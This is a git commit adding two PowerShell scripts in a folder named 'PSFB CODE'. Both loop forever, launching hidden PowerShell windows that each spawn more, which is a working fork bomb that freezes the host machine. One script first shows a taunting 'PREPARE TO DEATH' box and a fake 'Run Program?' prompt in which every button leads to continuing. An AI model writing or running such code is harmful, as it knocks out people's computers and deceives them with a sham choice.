031eb993eddb512af9b9990fc264aec469bfeb09
AleksAndPowershell <35122599+AleksAndPowershell@users.noreply.github.com>
2020-03-07 14:01:47 -0500

    Add files via upload

---
+++ PSFB CODE/PSFB3.ps1
@@ -0,0 +1,5 @@
+﻿Do {
+    start powershell -windowstyle hidden { start-process powershell.exe -WindowStyle hidden
+}
+}
+Until ($x -eq $true)
---
+++ PSFB CODE/psfb2.ps1
@@ -0,0 +1,16 @@
+﻿{
+[System.Reflection.Assembly]::LoadWithPartialName(“System.Windows.Forms”)
+[Windows.Forms.MessageBox]::Show(“PREPARE TO DEATH”, “HAHAHAHAHAHAHAHA”, [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information)
+[void][System.Reflection.Assembly]::LoadWithPartialName(‘Microsoft.VisualBasic’) 
+$result = [Microsoft.VisualBasic.Interaction]::MsgBox(“Run Program?”, ‘YesNoCancel,Question’, “Information Extraction”) 
+switch ($result) {
+‘Yes’ { “Continue” }
+'No' { "Continue" }
+'Cancel' { "Continue" }
+}
+}
+Do {
+    start powershell -windowstyle hidden { start-process powershell.exe -WindowStyle hidden
+}
+}
+Until ($x -eq $true)
